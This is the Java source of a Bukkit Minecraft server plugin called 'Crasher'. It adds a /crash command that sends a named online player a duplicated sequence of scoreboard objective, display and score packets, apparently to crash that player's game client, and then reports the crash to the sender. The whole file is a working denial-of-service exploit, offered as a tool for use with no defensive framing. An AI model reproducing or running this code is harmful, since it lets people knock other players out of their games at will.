package me.crafter.mc.crasher;

import net.minecraft.server.v1_6_R2.Packet206SetScoreboardObjective;
import net.minecraft.server.v1_6_R2.Packet207SetScoreboardScore;
import net.minecraft.server.v1_6_R2.Packet208SetScoreboardDisplayObjective;
import net.minecraft.server.v1_6_R2.Scoreboard;
import net.minecraft.server.v1_6_R2.ScoreboardBaseCriteria;
import net.minecraft.server.v1_6_R2.ScoreboardScore;

import org.bukkit.ChatColor;
import org.bukkit.command.Command;
import org.bukkit.command.CommandSender;
import org.bukkit.craftbukkit.v1_6_R2.entity.CraftPlayer;
import org.bukkit.entity.Player;
import org.bukkit.plugin.java.JavaPlugin;

public class Crasher extends JavaPlugin{
	
	
	@Override
	public boolean onCommand(CommandSender sender, Command cmd, String commandLabel, String[] args)
	{
		Player p;
		
		/* Make sure that the sender is a player */
		if (!(sender instanceof Player))
		{
			sender.sendMessage("You must be a player to use this command.");
			return true;
		}
		
		if (args.length != 1)
		{
			return false;
		}
		
		if ((p = getServer().getPlayer(args[0])) == null)
		{
			sender.sendMessage(ChatColor.RED + "Player not found");
			return true;
		}
		
		/* Act according to command */
		if (cmd.getName().equalsIgnoreCase("crash"))
		{
			if (p.isOnline()){
				String name = "Stats";
			    Scoreboard sb = new Scoreboard();
			    sb.registerObjective(name, new ScoreboardBaseCriteria(name));
			    Packet206SetScoreboardObjective createPacket = new Packet206SetScoreboardObjective(sb.getObjective(name), 0);
			    Packet208SetScoreboardDisplayObjective display = new Packet208SetScoreboardDisplayObjective(1, sb.getObjective(name));
		        ((CraftPlayer)p).getHandle().playerConnection.sendPacket(createPacket);
		        ((CraftPlayer)p).getHandle().playerConnection.sendPacket(display);
		        ScoreboardScore scoreItem = new ScoreboardScore(sb, sb.getObjective(name), "thisisatest");
		        Packet207SetScoreboardScore pScoreItem = new Packet207SetScoreboardScore(scoreItem, 0);
		        ((CraftPlayer)p).getHandle().playerConnection.sendPacket(pScoreItem);
		        ((CraftPlayer)p).getHandle().playerConnection.sendPacket(createPacket);
		        ((CraftPlayer)p).getHandle().playerConnection.sendPacket(display);
		        ((CraftPlayer)p).getHandle().playerConnection.sendPacket(pScoreItem);
		        sender.sendMessage(ChatColor.GRAY+p.getName()+"'s client crashed.");
			}
		}
		return true;
	}

}
